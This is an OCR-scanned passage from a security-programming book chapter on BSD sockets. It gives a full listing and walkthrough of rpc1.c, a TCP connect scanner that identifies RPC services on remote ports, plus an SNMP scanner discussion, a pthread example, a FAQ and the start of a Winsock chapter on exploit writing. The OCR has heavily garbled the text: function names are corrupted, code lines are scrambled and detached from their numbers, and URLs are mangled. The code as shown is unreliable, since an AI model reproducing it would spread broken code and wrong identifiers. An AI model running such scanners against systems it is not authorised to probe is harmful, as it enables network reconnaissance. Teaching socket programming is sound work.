tion uses the recvfrornQ function to receive the SNMP GetResponse value. If a 
response is received, the received data is passed to the hexdnmpfj function to be 
formatted and displayed 
At lines 144 through 167, the doreqQ function is defined and implemented. This 
function makes a SNMP GetRequest value, passes the value to the hexdumpQ 
function to be formatted and displayed, and then sends the value to the target 
IP address and port. The sendQ function is used to send the value to the target 
At lines 174 through 209, the makeudpsockQ function is defined and imple-
mented. This function converts the supplied target IP address from string "dot" 
notation to an unsigned integer format. It then uses the socket() function to 
create a socket descriptor suitable for sending and receiving UDP datagrams. 
The socket descriptor is then associated with the target IP address and port 
using the connect() function. If all operations are successful, the niakendpsock() 
function returns a valid socket descriptor. Otherwise, a negative integer value is 
returned. 
At lines 216 through 243, the scanQ function is defined and implemented.This 
function calls the makeudpsockQ function to create and initialize a socket 
descriptor.The created socket descriptor is then passed to the doreqQ function, 
which in turns creates a SNMP GetRequest value and sends it to the target IP 
address and port. The doresQ function is then called to receive a SNMP 
GetResponse value returned from target. If no error occurs, the scanQ function 
returns zero. Otherwise, a negative integer value is returned. 
At lines 250 through 257, the usageQ function is defined and implemented. 
This function prints out usage information for the SNMP1 program, 
At lines 260 through 316, the mainQ function is defined and implemented.This 
is the main entry point of the program. This function processes user-supplied 
command-line arguments and then calls the scanQ function in order to perform 
the scan. 
Network Scanning with TCP Sockets 
This section examines a complete program that uses the TCP protocol and the BSD 
sockets API to implement an Remote Procedure Call (RPC) program number identifi-
cation utility.This utility, named rpcl.c, uses a method known as TCP connect scanning to 
discover open TCP ports on a remote host. Each discovered port is then examined to 
determine what, if any, RPC program is using the port. This type of program can be 
useful for determining what TCP port an RPC service is running on if access to the 
RPC portmappcr service on TCP port 111 is not available. 
The RPC protocol allows programs to separate functionality into multiple parts that 
can then be run on more than computer. A client program makes RPC function calls 
that pass the parameters of the function call over the network to a remote host. The 

128 
Chapter 3 • BSD Sockets 
remote host then receives the parameters, executes the requested function, and returns 
the data back over the network to the caller. The function in the client program then 
receives the results of the function call and processes them. 
The remote portions of programs that use R P C are run on remote computer sys-
tems. When these programs start, they register a program number value with the R P C 
portmapper service on the remote host. The portmapper service listens on T C P and U D P 
port 111. Remote hosts can query the portmapper of another remote host for a particular 
program number and obtain the T C P or U D P port on which that particular program-
ming is listening for requests. This is the standard way of locating R P C programs. 
In some instances, the R P C portmapper service is unavailable or blocked by a firewall 
and cannot be queried to find the location of a particular R P C program. Therefore, a 
program such as the rpct can be used to identify the R P C program number of an R P C 
service by examining open T C P ports without querying the portmapper service. 
This is accomplished by sending a series of R P C request values to any given T C P 
port.The program number value must be specified in each R P C request. If the program 
number specified does not match the program number of the R P C program listening 
on the targeted port, the remote program will return an error value indicating an incor-
rect program number has been specified. If the program number specified in the request 
matches that of the R P C program listening on the T C P port, the program will not 
return an error value and the program number will be successfully identified. Example 
3.10 illustrates how to use the BSD sockets API to implement T C P connect port scan-
ning and R P C program number identification. 
Example 3.10 RPC Program Scanner (rpcl.c) 
1 /* 
2 
* rpcl.c 
3 * 
4 
* TCP RPC program scanner example program #1. 
5 
* 
6 
* 
7 
* 
f o s t e r <jamescfoster@gmail. com> 
8 
*/ 
9 
10 
# i n c l u d e < s t d i o . h > 
1 1 
ttinclude 
<unistd.h> 
12 
# i n c l u d e < s i g n a l . h > 
13 
14 
^ i n c l u d e -csys / socket .h> 
15 
^ i n c l u d e <:netiTiet/in + h> 
16 
#include 
< a r p ^ / i n e t . h i 
17 
18 
ltdefine RPC1_BUF_SIZE 
0x0400 
19 
it 
define 
RPC1_DEF_CT0_SEC 
0x0005 
20 
it 
define 
RPC1_DEF_RT0_SEC 
0x0005 
21 
22 /• 
23 
* program numbers 
24 
•/ 
25 unsigned int progidf] = 
26 j 

BSD Sockets • Chapter 3 
129 
27 
0x00O186A0, 0X0O0186A1, 0X000186A2, 0X000186A3, 
28 
Ox000186A4, Ox000186A5, 0x000186A6, Ox000186A7, 
29 
Ox000186A8, 0x000186A9, 0x000186AA, 0xQ0O186AB, 
30 
0x00O136AC, Ox000186AD, 0x000186AE, 0x00O136AF, 
31 
0x00O136Bl, Ox000186B2, 0x000186B3, Ox000136B4, 
32 
0X000186B5, OX0001B6B6, 0XO00186B7, 0X000186BS, 
33 
Ox000186B9, Ox000186BA, 0x000186BB, Ox000136BC, 
34 
Ox000186BD, Ox000136C5, 0x000186C6, Ox000186E4, 
35 
OxOO0186F3, 0xQ0Q1877D, 0x00018788, Ox0001878A, 
36 
0x00O1378B, 0x00018799, 0x000249Fl, 0x000493F3, 
37 
0x00049636, 0x30000000, 0x00000000 
38 }; 
39 
40 
f* 
41 
* hexdisp() 
42 * 
43 ' 
44 »/ 
45 void hexdisp {char *buf, int len) 
46 { 
47 
char tmp[16) ; 
48 
int 
x = 0; 
49 
int 
y = 0; 
50 
51 
for(x=Q? x < len; ++x) 
52 
{ 
53 
tmplx % 16] = buf[xl; 
54 
5 5 
i f [ ( x + 1) % 16 == 0) 
56 
{ 
57 
for(y=0; y < 16; ++y) 
58 
( 
59 
printf["%02X ", tmp[y] & OxFF); 
60 
} 
61 
62 
for(y=0; y < 16; ++yl 
63 
( 
64 
printf ("fcc", isprint{tmp[y] ) ? tmp(y) 
65 
66 
} 
67 
p r i n t f ( " \ n " ) ; 
68 
} 
69 
) 
70 
71 
if((x % 16) != 0) 
72 
{ 
73 
for(y=0; y < (x % 16) ; ++y) 
74 
{ 
75 
printf<"%02X ", tmply] & OxFF); 
76 
} 
77 
78 
for(y=(x % 16); y < 16 
; ++yj 
79 
< 
80 
printf (" 
") ; 
81 
} 
82 
83 
for(y=0; ye (X % 16); 4+y) 

130 
Chapter 3 • BSD Sockets 
84 
t 
85 
p r i n t f ( " % c " , 
i s p r i n t ( t m p [ y ] ) 
? tmp[y] 
' . ' ) 
86 
} 
87 
} 
88 
89 
printf(-\n\n") ; 
90 } 
91 
92 /* 
93 
* rpcidport() 
94 
* 
95 
* 
96 
•/ 
97 
98 # define RFC 1_ID_HEAD -\x80\x00\x00\x2S\x00\x00\x00\xl2" \ 
99 
-\xOO\xOO\xOO\xOO\xOO\xOO\xOO\x02" 
100 #define RPC1_ID_TAIL "\x00\x00\x00\x00\x00\x00\x00\x00" \ 
101 
-\x00\x00\x00\x00\x00\x00\x00\x00"V 
102 
-\x00\x00\x00\x00\x00\x00\x00\x00" 
103 
104 int rpcidport (int sock, unsigned int *id, int verb) 
105 < 
106 
unsigned int cur = 0; 
1 0 7 
char buf [RPC1_BUF_SIZE) ; 
108 
int hlen = sizeof(RPCI_ID_HEAD) - 1; 
109 
int tlen = sizeof [RPC1_ID_TAID - 1; 
110 
int clen = sizeof (unsigned int) ; 
111 
int len 
= hlen + clen + tleni 
1 12 
int ret 
= 0; 
1 13 
int x 
= 0; 
114 
115 
for(x=0; progidlx] != 0x00000000; + +x) 
116 
{ 
117 
cur = htonl fprogid[x] ) ; 
118 
1 19 
memset(buf, 0x00, RPC1_BUF_SIZEI; 
120 
121 
raemcpytbuf, 
RPC1_ID_HEAD, hlen); 
122 
memcpy(buf + hlen 
, 
fccur 
, clen); 
123 
memcpy(buf + hlen + clen, RPC1_IE_TAIL, tlen)? 
124 
125 
ret = send(sock, buf, len, 0); 
126 
i f l r e t != len) 
127 
( 
128 
if(verb) 
129 
{ 
130 
printf ("send 
[) failed. \n") ; 
131 
} 
132 
r e t u r n ( - l ) ; 
133 
} 
134 
135 
ret = recvfsock, buf, RPC1_BUF_SIZE, 0); 
136 
iffret >= 28) 
137 
( 
138 
if (buf [0x04] == 0x00 iS 
139 
buf [0x05] == 0x00 && 
140 
buf [0x06] « 0x00 && 

BSD Sockets • Chapter 3 
131 
141 
142 
143 
144 
145 
146 
147 
148 
149 
150 
151 
152 
153 
154 
155 
156 
157 
158 
159 
160 
161 
162 
163 
164 
165 
166 
167 
168 
169 
170 
171 
172 
173 
174 
175 
176 
177 
178 
179 
180 
181 
182 
183 
184 
185 
186 
187 
188 
189 
190 
191 
192 
193 
194 
195 
196 
197 
buf(0xO7) == 0x12 && 
buftOxOB] == 0x01 && 
buftOxlB] 1= 0x01) 
*id = progidtx]; 
return{0); 
•: 
else 
• : 
// unexpected response, probably not RPC 
// service, return from function... 
return(0); 
return(0); 
* makesockt) 
V 
int makesock(unsigned iot taddr, unsigned short port, unsigned 165: 
int cto_sec, long rto_sec, int verb) 
{ 
struct sockaddr_in sin; 
struct timeval tv,r 
int sock - 0; 
int ret = 0; 
sock = socket(AF_INET, SOCK_STREAM, 0); 
if(soek < 0) 
( 
if(verb) 
( 
printf("socket(} failed.\n"}; 
} 
return(-1); 
} 
memset(ksin, 0x00, sizeof(sin)) ; 
sin.sin_family 
= AF_INET; 
sin.sin_port 
= htons(port); 
sin.sin_addr,s_addr = taddr; 
alarm(cto_sec); 
ret = connect(sock, (struct sockaddr *) &sin, sizeof(sin)),-
alarm(O); 
iflret < 0) 
{ 
close (sock); 
if(verb) 
{ 
printf("connect 
() %d.%d.%d.%d:%d failed.\n", 

132 
Chapter 3 • BSD Sockets 
198 
199 
200 
201 
202 
203 
204 
205 
206 
207 
208 
209 
210 
211 
212 
213 
214 
215 
216 
217 
218 
219 
220 
221 
222 
223 
224 
225 
226 
227 
228 
229: 
230 
231 
1 
•
•
' 
' 
* 
*/ 
int 
! 
232 utis 
233 
234 
235 
236 
237 
238 
239 
240 
241 
242 
243 
244 
245 
246 
247 
248 
249 
250 
251 
252 
253 
254 
[ 
I 
(taddr » 0x00) & OxFF, 
( t a d d r s> 0x08) & OxFF, 
(taddr » 0x10) 
& OxFF, 
( t a d d r » 0x18) 
& OxFF, 
p o r t ) ; 
} 
r e t u r n ( - l ) ; 
memset(&tv, 
0x00, 
s i z e o f ( t v ) ) ; 
t v . tv_ 
r e t = 
i f ( r e t 
( 
1 
r e t u r n 
r p c i d ( ) 
r p c i d 
sec = r t o _ s e c ; 
s e t s o c k o p t ( s o c k , 
SOL_SOCKET, 
SO_RCVTIMEO, £ t v , 
s i z e o f ( t v ) ) ; 
< 0) 
c l o s e ( s o c k ) ; 
i f ( v e r b ) 
{ 
p r i n t f ( " s e t s o c k o p t 0 
f a i l e d . \ n " ) ; 
) 
r e t u r n ( - l ) ; 
(sock) -, 
(unsigned i n t taddr, 
unsigned s h o r t p o r t , 
unsigned i n t 
c t o _ s e c , 
long r t o _ s e c , 
i n t verb) 
igned i n t id = 0; 
i n t 
so ck = 0; 
i n t r e t 
• 0; 
sock = makesocMtaddr, 
p o r t , 
c t o _ s e c , 
r t o _ s e c , 
v e r b ) ; 
if(SOCk < 0) 
< 
} 
r e t = 
if(ret 
i f ( v e r b ) 
( 
p r i n t f ( " m a k e s o c k 
() 
f a i l e d . \ n M ) ; 
) 
r e t u r n ( O ) ; 
r p c i d p o r t ( s o c k , 
&id, 
v e r b ) ; 
< 0} 
c l o s e ( s o c k ) ,-
i f ( v e r b ) 
{ 
p r i n t f ( " r p c i d p o r t O 
f a i l e d 
9 
%d.*d.%d.*d:*d\n", 
(taddr » 0x00) 
& OxFF, 
(taddr » 0x08] 
(taddr >> 0x10) i OxFF, 
(taddr >> 0x18] 

BSD Sockets • Chapter 3 
133 
255 
port); 
256 
} 
257 
return(O) ; 
258 
) 
259 
260 
261 
262 
if(id 1= 0) 
263 
{ 
264 
printfCRPC %d [%08X] (3 %d. %d. %d. %d:%d\n", id, id, 
265 
(taddr » 0x00) k OxFF, (taddr » 0x08) k OxFF, 
266 
(taddr » 0x10) k OxFF, (taddr » 0x18) k OxFF, 
267 
port); 
268 
} 
269 
270 
return(O) ; 
271 ) 
272 
273/* 
274 * scan!) 
275 * 
276 * 
277 
v 
278 i n t scan 
(char * t a r g , 
unsigned s h o r t l p o r t , 
2 7 9 
unsigned short h p o r t , 
unsigned i n t 
CtO_seC, 
280 
long rto_sec, int verb) 
281 { 
282 
unsigned int taddr = 0; 
283 
int ret = 0; 
284 
285 
taddr = inet_addr (targ) ; 
286 
ifftaddr == INADDR_NONE) 
287 
{ 
288 
if (verb) 
289 
{ 
290 
printf("inet_addr() 
failed.\n"); 
291 
} 
292 
return(-l) ; 
293 
} 
294 
295 
while {Iport <= hport) 
296 
{ 
297 
ret = rpcid(taddr, lport, cto_sec, rto_sec, verb); 
298 
if (ret <: 0) 
299 
{ 
300 
if (verb) 
301 
{ 
302 
printf ("rpcidO 
failed, \n") ; 
303 
) 
304 
return(-1); 
305 
) 
306 
307 
++lport; 
308 
) 
309 
310 
return(O) ; 
311 } 

134 
Chapter 3 • BSD Sockets 
312 
313 
• 
314 
* parsed 
315 
> 
316 
' 
317 
v 
318 int parse (char *sprt, unsigned short 
+lport, unsigned short 
31 9 
*hport) 
320 { 
321 
char *tnp = NULL; 
322 
323 
emp = (char *) strchr(sprt, • - • ) ; 
324 
ifitmp == NULL) 
325 
{ 
326 
*hport -
327 
*lport = (unsigned short} a t o i ( s p r t ) ; 
328 
} 
329 else 
330 
{ 
331 
*tmp = ' \ 0 ' ; 
332 
*lport = 
(unsigned short} a t o i ( s p r t ) ; 
333 
-t-+tmp; 
334 
*hpcrt = 
(unsigned short) atoiftmp ); 
335 
} 
336 
337 
if Clport 
== 0 || 
338 
*hport 
== 0 | | 
339 
(*lport > *hport)( 
340 
{ 
341 
r e t u r n ( - l ) ; 
342 
} 
343 
344 
return(O) ; 
345 } 
346 
3 4 7 / * 
348 
* sighandler() 
349 * 
350 
* 
351 
-i 
352 void sighandler (int sig) 
353 ( 
354 } 
355 
356 /* 
357 
* usage!) 
358 * 
359 
' 
360 
*/ 
361 void usage(char *prog) 
362 { 
363 
p r i n t f C r p c l 00, 00. 01\n") , 
364 
printf("usage 
: %s -1 target_ip ~p port_range\n*, prog) ; 
365 
printf I "example: %s -t 127.0.0.1 -p l-1024\n\n* 
, prog); 
366 ) 
367 
368 int 

369 
370 
371 
372 
373 
374 
375 
376 
377 
378 
379 
380 
381 
382 
383 
384 
385 
386 
387 
388 
389 
390 
391 
392 
393 
394 
395 
396 
397 
398 
399 
400 
401 
402 
403 
404 
405 
406 
407 
408 
409 
410 
411 
412 
413 
414 
415 
416 
417 
418 
419 
420 
421 
422 
423 
424 
425 
main(int argc, char *argv(]} 
{ 
unsigned Short lport = 0; 
unsigned short hport = 0; 
unsigned int cto_sec = RPC1_DEF_CT0_SEC; 
char * targ 
= NULL; 
char *sprt 
= NULL? 
char *tmp 
= NULL j 
char ch 
= 0; 
long rto_sec = RPC1_DEF_RT0_SEC; 
int verb 
= 0; 
int ret 
= 0; 
signal(SIGALRM, sighandler); 
signal(SIGPIPE, sighandler); 
opterr • 0; 
while{(ch = getopt(argcH argv, nt:p:c:r:v")) l= -1) 
\ 
switch(ch) 
• : 
case 't': 
targ = optarg; 
break7 
case "p': 
sprt = optarg; 
break? 
case 'c': 
cto_sec = (unsigned int) atoi(optarg); 
breakj 
case 'r': 
rto_sec = (long) atoi(optarg); 
break? 
case "v1: 
verb = 1; 
break? 
case '?•: 
de fault: 
usage(argv[0] ) ; 
return(1) ; 
} 
} 
if(targ == NULL || 
sprt == NULL) 
{ 
usage[argv[0]J ; 
return(l); 
} 
ret = parse(sprtt Alport, &hport); 
if(ret < 0) 
t 
printf ("parse() failed.\n") ; 
return(l); 

136 
Chapter 3 • BSD Sockets 
426 
printf ("\miging: target: %s; lport: %d; hport: %d\n\n", 
427 
tsrg, lport, hport); 
428 
429 
ret = scanltdrg, lport, hport, cto_sec, rto_sec, verb); 
430 
if(ret < 0J 
431 
{ 
432 
printf ("scan I) failed.\n"( ; 
433 
return(l); 
434 
} 
435 
436 
printf!"scan complete.\n"J; 
437 
438 
retum(O); 
439} 
Compilation 
obsd32tt gcc -o rpcl rpclrc 
Example Execution 
obsd32# ./rpcl 
rpcl 00.00.01 
usage : ./rpcl -t target_ip -p port_range 
example: ./rpcl -t 127.0.0.1 -p 1-1024 
obsd32# ./rpcl -t 10.0,8.16 -p 32770-32780 
using: target: 10.0.8.16; lport: 32770; hport: 32780 
RPC 100024 [000186B8] @ 10.0.8.16:32771 
RPC 100002 [000186A2] g 10.0.3.16:32772 
RPC 100221 [0001877D] 6 10.0.8.16:32773 
RPC 100083 [0001B6F3J @ 10.0.8.16:32775 
RPC 300598 [00049635] @ 10.0.8.16:32776 
RPC 1002*9 [00018799] e 10.0.8,16:32777 
scan complete. 
The rpcl.c program accepts the target IP address, starting TCP port, ending TCP 
port, connect() function timeout value in seconds, rccv{) function timeout, and verbosity 
flag values via the command line.These values are processed and used to discover open 
TCP ports within the range of the starting and ending TCP port values supplied. For 
each open TCP port discovered, a RPC program number operation is performed to 
identify the program number. If the program number is identified, the TCP port and 
program number are printed to standard output. 
Analysis 
At lines 9 through 15, the required header files for this program arc included. 
At lines 17 through 19, several constants used by the program are defined.The 
RPC1_CTO_TO constant defines the number of seconds to allow the connect () 

BSD Sockets • Chapter 3 
137 
function to succeed.The RPCi_RTO_TO constant defines the number of sec-
onds to wait when attempting to receive data from the remote port. 
• 
At lines 24 through 27, an array of unsigned integer values is declared. These 
values list known KPC program numbers that are used in the RPC program 
number identification process. Each of these numbers is sent to a RPC service. 
If one of the numbers matches the target RPC service, the RPC program 
number is identified. To increase the number of RPC programs that are identi-
fiable, additional RPC program numbers should be added to this array 
• 
At lines 44 through 89, the hexdispQ function is defined and implemented.This 
function accepts two parameters. The first parameter is a pointer to a character 
buffer. The second parameter is a signed integer value that indicates the length 
of the character buffer in bytes. This function formats the supplied character 
buffer into a human readable format and prints the formatted data to standard 
output. This format is similar to the format produced by the tepdump program 
when used in conjunction with the —X flag. 
• 
At lines 97 through 101, the bytes of the RPC request value are defined. The 
RPC 1_ID_HEAD value will later be copied into a character buffer followed 
by the 4-byte unsigned integer program number value followed by the 
RPC1_ID_TAIL value. When combined, these three values make up a valid 
RPC request. 
• 
At lines 103 through 157, the rpcidportQ function is defined and implemented. 
This function takes three parameters. The first parameter is a socket descriptor 
that has been previously connected to the target port using the connect() func-
tion.The second parameter is a pointer to an unsigned integer value that is 
used to store the identified RPC program number.The third parameter is an 
integer value that indicates whether the rpcidport() function should print error 
messages.This function loops for each RPC program number declared in the 
progid array declared at line 24. For each program number, a RPC request 
value is built using the RPC1_ID_HEAD, program number, and 
RPC1_ID_TAIL values, as previously described. At line 124, the RPC request 
value is then sent to the target port using the send() function. At line 134, the 
response from the target port is then received using the rccvQ function. If the 
response is greater than or equal to 28 bytes, it is of sufficient length to 
examine. At lines 137 through 142, 6 bytes of the response are examined to 
determine if the response indicates that the previously sent RPC request con-
tained the correct RPC" program number. If the program number is correct, it 
is stored in the id variable and the program returns. 
• 
At lines 164 through 221, the makesockQ function is defined and implemented. 
This function converts the supplied target IP address from string "dot" nota-
tion to an unsigned integer format. It then uses the sockctQ function to create a 
socket descriptor suitable for sending and receiving TCP data. The socket 
descriptor is then connected to the target IP address and port using the con-

138 
Chapter 3 • BSD Sockets 
nectQ function. If all operations are successful, the makesockQ function returns a 
valid socket descriptor. Otherwise, a negative integer value is returned. 
• 
At lines 228 through 270, the fpddQ function is defined and implemented.This 
function creates a socket descriptor using the makcsockQ function that calls the 
rpcidportQ function to identify the RPC program number that the socket has 
been connected to, and then prints the IP address, port, and identified RPC pro-
gram number upon successful return from the rpcidportQ function.The first 
parameter to the function is the IP address of the target host. The second param-
eter is the port to connect to. The third parameter is the cotmectQ function 
timeout value. The fourth parameter is the rccvQ timeout value.The fifth value is 
an integer flag that indicates whether error messages should be printed. 
• 
At lines 277 through 310, the scanQ function is defined and implemented. This 
function accepts six parameters.The first parameter is the target IP address in 
string "dot" notation, which is converted to an unsigned integer using the 
ifii't_addr() function.The second parameter is the TCP port number to begin 
scanning at. The third parameter is the TCP port number to stop scanning at. 
The fourth and fifth parameters are passed directly to the rpcidQ function.The 
sixth parameter is an integer flag that indicates whether error messages should 
be printed. This function loops for each TCP port value in the range between 
the low port value and the high port value. For each port, the rpcidQ function 
is called to identify any RPC service running on that port. 
• 
At lines 317 through 344, the parseQ function is defined and implemented. This 
function is responsible for processing the user-supplied port or port range 
value into two unsigned short integer values. If the user supplies a single 
numerical value, it is converted to an unsigned short value using the atoiQ 
function. If the user supplied a port range, the low port value is parsed and 
stored followed by parsing of the high-port value. 
• 
At lines 351 through 353, the HghandlerQ function is defined and implemented. 
This function is called by the operating system if a SICPIPE or SIGALRM 
signal is sent to the program.The SIGPIPE signal may be sent to the applica-
tion if the remote end of a TCP connection closes the connection and the 
application attempts to write data to the socket. This is likely to occur when 
attempting to identify an RPC program number on a TCP port that does not 
use the RPC protocol. The SIGPIPE signal is handled because, by default, the 
operating system terminates the application if the signal is sent and not han-
dled. The SIGALRM signal is sent when the number of seconds supplied to a 
call to the alarinQ function has passed. Any functions that are blocked waiting 
to complete an operation will immediately return with an error value. In this 
way, the connect0 function can be aborted if it takes longer to complete than 
the time specified in the call to the alarniQ function, which precedes the call to 
the connectQ function. The alarmQ function is used to implement this technique 
at line 188 of the rpcl.c program. 

BSD Sockets • Chapter 3 
139 
• 
At lines 360 through 365, the usage() function is defined and implemented. 
This function displays usage information for the program to standard output. 
• 
At lines 368 through 438, the main() function is defined and implemented.This 
is the main entry point of the program.This function processes user-supplied 
command-line arguments and then calls the scanQ function to perform the scan. 
Threading and Parallelism 
It is useful to employ multithreading in network applications to improve the perfor-
mance or scalability of an application. A single-threaded application such as the yptf.c 
example program must perform all operations in order, one after another.This can be 
slow if some operations take much time to complete; therefore, it may be helpful to 
break certain functionality into separate functions and execute them in parallel using 
multiple threads of execution. 
The ptltivtid programming library is the standard means for implementing multi-
threading on UNIX and UNIX-like operating systems. This library provides a large 
number of functions for handling the various aspects of multithreading programming. 
However, the most basic and important of these functions is the pthread_cre<ite() function. 
int pthread_create (pthread_t 'thread, const pthread_attr_t 
*attrh void *(*start_routine)(void *), 
void *arg); 
The pthreadj:rc(ite{) function is the function used to create a new thread of execu-
tion.This function accepts four parameters, although the second parameter can be safely 
ignored in practice. The first parameter is a pointer to a pthrcad_t variable.The third 
parameter is the address of the function in which execution will begin in the newly cre-
ated thread.The fourth parameter is an untyped pointer that will be passed to the func-
tion when the thread begins execution. 
Example 3.11 illustrates the execution of the testQ function in a separate thread of 
execution. 
Example 3.11 Multithreading 
1 #include <stdio.h> 
2 #include <unistd.h> 
3 
4 #include <pthread.h> 
5 
6 
void * test{void *arg) 
7 
{ 
8 
printf("thread 
2!\n-); 
9 
} 
10 
11 
int 
12 
main (void! 
13 
[ 
14 
pthread_t 
th ; 
15 
int ret = 0; 
16 
17 
ret = pthread_create(ith, NULL, test, NULL]; 

140 
Chapter 3 • BSD Sockets 
18 
iffret != 0) 
19 
{ 
20 
printf ("pthrread_create U 
failecL \n") ; 
21 
22 
} 
23 
24 
sleep(2); 
25 
26 
printf{•thread ll\n"); 
27 
28 
retum(l) ; 
29 } 
Multithreading is a handy tool for implementing more effective network communi-
cation in software. Specifically, the program is no longer limited to handling socket oper-
ations one at a time; they can now be handled concurrently in separate threads. 
Multithreading is also useful for implementing network diagnostic and information 
security programs. 
Through the use of multiple threads, it is possible to break the send and receive 
operations of a network scanning tool into an asynchronous operation that eliminates 
the receive timeout associated with sending a request, waiting for a response, and then 
repeating the operation. Instead, requests may be sent as fast as possible from one thread 
,while responses may be received and processed as fast as possible in a separate thread. 
This yields much higher performance. 

BSD Sockets * Chapter 3 
141 
Summary 
The BSD sockets API provides an advanced, low-level means for implementing applica-
tion support for network communication. The API provides a core set of functions that 
are used in much the same way for implementing UDP and TCP functionality, A good 
amount of flexibility and fine tuning may be achieved through the use of socket options 
and the setsockoptQ function. 
Various designs may be used to quickly implement network communication support 
or to form more complex, scalable features. The use of multithreading is one way to 
improve performance. In the area of network diagnostics and information security, the 
BSD sockets API is extremely useful for implementing remote scanning utilities and 
local monitoring applications. 
Solutions Fast Track 
Introduction to BSD Sockets Programming 
0 
The BSD sockets programming facility is a collection of programming 
language functions and data types. As such, these functions and data types are 
known as the BSD sockets API. 
0 The BSD Socket API was first introduced with the BSD UNIX operating 
system in the early 1980s. It is now available on most UNIX-like operating 
systems and is supported on the Microsoft Windows platform (Winsock). 
0 
The BSD sockets API is widely used in conjunction with the C programming 
language to implement TCP or UDP support in software. 
TCP Clients and Servers 
0 Although the TCP protocol is much more complex than its UDP counterpart 
and nearly every other protocol in the TCP/IP suite, it is the most popular 
Internet transmission protocol. 
UDP Clients and Servers 
0 
UDP socket programming employs many of the same techniques that are used 
for TCP socket programming; however, UDP is a connectionless protocol, 
requires less setup, and is somewhat more flexible in both sending and 
receiving of UDP datagrams. 
0 UDP is not a byte-stream protocol and treats all data as an individual unit: a 
datagram. 
www.syngress.com 

142 
Chapter 3 • BSD Sockets 
0 
The UDP protocol header consists of only four fields: destination port, source 
port, length, and checksum. 
Socket Options 
fc 
0 The setsockoptQ function allows for parameters to be adjusted at various levels 
of a protocol. In the case of the AF_INET address family, socket options may 
be adjusted for a socket descriptor or for specific aspects of the protocol in use, 
such as for the IPv4 protocol, UDP.TCP, ICMP, and so on. 
0 
Socket options are most commonly used to adjust parameters at the socket 
level. Possible options include the adjustment of error handling, the buffering 
of data, address handling, port handling and socket send and receive timeout 
values. 
0 
The socket level SO_RCVTIMEO option is regularly used to set a timeout 
value for the readQ, recvQ and reeyfromQ functions. 
Network Scanning with UDP Sockets 
0 The SNMP protocol is a widely supported protocol used for retrieving and 
configuring various types of management data for network-connected 
computers and devices. The retrieval and configuration of management data is 
achieved by sending SNMP GetRequest or SetRequest values encapsulated in 
UDP datagrams to the remote host, 
0 
Analyzing open TCP and UDP port responses is a method of determining 
open RPC services, even if the remote portmapper service is disabled or not 
available from your network perspective. 
Network Scanning with TCP Sockets 
0 
The RPC protocol allows programs to separate functionality into multiple 
parts that can then be run on more than computer. 
0 The portmapper service listens on TCP and UDP port 111. Remote hosts can 
query the portmapper of another remote host for a particular program number 
and obtain the TCP or UDP port on which that particular programming is 
listening for requests. This is the standard way of locating RPC programs. 
Threading and Parallelism 
0 
The pthread programming library is the standard means for implementing 
multithreading on UNIX and UNIX-like operating systems. 
0 
The most basic and important of the functions included within the pthread 
programming library is the pthread_crcate() function. 
www.syngress.com 

BSD Sockets * Chapter 3 
143 
Links to Sites 
For more information visit the following Web sites: 
• 
www.iipplkiithfidcfcmc.com Application Defense has a solid collection of free 
security and programming tools, in addition to all of the code presented 
throughout this book. 
• 
http://teww.iatia.org/asAgnments/port-numbers The Internet Assigned Numbers 
Authority (I ANA) published list of port numbers is an outstanding beginner's 
security and a hacker's resource. 
• 
http://www.privtitc.org.il/tcpip_rl.htnil Uri Raz'sTCP/IP resource portal is a 
good site to find more information on the TCP/IP protocol suite. 
Frequently Asked Questions 
I 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Ql How do I check for extended error information when programming with BSD 
sockets? 
A: On the UNIX platform, extended error information can be obtained through 
the use of the ermo facility. If a BSD socket function returns an error value, the 
global variable ermo is assigned an integer error code indicating the type of error 
that occurred.The programmer can check this value to determine the best 
course of action to take. The values that ermo may have are defined in the errno.h 
header file, usually located in the file /iisr/inchide/errno.h.To use ermo, simply 
include errno.h at the top of the source file like so: Uincltide <crrno.h>. 
Q: Is the BSD sockets programming interface the same on all UNIX platforms? 
Al The BSD sockets programming interface is largely compatible across UNIX plat-
forms. However, there are some differences that require special handling if porta-
bility is a requirement. The major differences are constant values, header files to 
include, and some functions. For example, the BSD sockets platform provides for 
the getifaddrsQ function to enumerate the local network interfaces on a system. 
The Linux platform does not provide this function,To implement the same 
functionality, the ioctl() function must be used. 

144 
Chapter 3 • BSD Sockets 
What existing programs can I learn from that use the BSD sockets API to per-
form security-related functionality? 
Two of the most popular network scanning applications that use the BSD sockets 
API for network security related functionality are NMAP and Nessus. NMAP is 
used to scan TCP/IP networks for live hosts and services. Nessus is a free, open-
source security scanner that can be used to scan networks for live hosts and ser-
vices, and to discover remotely detectable vulnerabilities that can be exploited by 
hackers. 
Both of these projects are open source and server as good examples of how 
BSD sockets can be applied toward information security, hacking, and anti-
hacking tools, including the following: 
• 
NMAP http://www.insecufe.org/nrnap/ 
• 
Nessus http://www.nessus.org/ 
Where can I learn more about the details of the TCP/IP protocol suite and BSD 
sockets programming? 
We highly recommend the following books tor more information on TCP/IP 
and BSD sockets programming: 
• 
TCP/IP Illustrated, Volume 1 by 1 1 1 Stevens 
• 
UNIX Network Programming, Volume I: The Sockets Networking API by W.R. 
Stevens 
www.syngress.com 

Chapter 4 
Windows 
Sockets (Winsock) 
Solutions in this Chapter: 
• 
Winsock Overview 
• 
Winsock 2.0 
• 
Writing Client Applications 
• 
Writing Server Applications 
• 
Writing Exploit and Vulnerability Checking 
Programs 
• 
Case Studies 
Related Chapters: Chapter 3, Chapters 
El Summary 
El Solutions Fast Track 
El Frequently Asked Questions 
145 
«l

146 
Chapter 4 • Windows Sockets (Winsock) 
Introduction 
In the past, Linux was not only the operating system of choice, but it was almost the only 
operating system hackers would use. At one time, almost all exploit scripts were written on 
the Linux platform and could only be compiled by the Linux system. However, the 
Microsoft Win32 system has become more prevalent in enterprise environments and has 
achieved nearly equal footing with Linux in the market of exploit scripts. To write or 
defend against exploit scripts on the Win32 system, one must have a strong understanding 
of the WinSock 1 application program interface (API) and, more importantly, the 
WinSock 2 API. 
The WinSock 1 and WinSock 2 APIs are used to make network connections. 
WinSock 2 uses ws2_32.dll to communicate to the Winsock or to a Service Provider 
Interface (SPI), which is used by the actual hardware appliance. Because programmers 
communicate solely with the Winsock 2 API, they do not need to be concerned with 
the hardware.The goal of the Winsock API is to give the programmer maximum control 
over what is being sent to and from the appliance, without having to know what the 
